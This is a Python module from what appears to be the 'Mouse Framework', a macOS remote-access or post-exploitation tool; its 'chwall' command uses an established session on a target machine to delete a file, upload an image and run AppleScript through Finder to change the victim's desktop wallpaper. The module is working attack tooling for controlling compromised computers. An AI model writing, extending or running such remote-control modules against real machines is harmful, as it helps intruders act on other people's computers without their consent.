#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import time
import json
import core.helper as h

class command:
    def __init__(self):
        self.name = "chwall"
        self.description = "Change desktop wallpaper."
        self.type = "applescript"

        

    def run(self,session,cmd_data):
        picture = raw_input(h.WW+"[>]"+h.WHITE+" Wallpaper Picture: "+h.ENDC).strip(" ")
        one = '"'
        payload = """
        tell application "Finder" to set desktop picture to POSIX file "/usr/local/share/picture.jpg"
        """
        session.send_command({"cmd":"rm","args":"/usr/local/share/picture.jpg"})
        session.upload_file(picture,"/usr/local/share","picture.jpg")
        cmd_data.update({"cmd":"applescript","args":payload})
        picture = session.send_command(cmd_data).strip()
        return ""
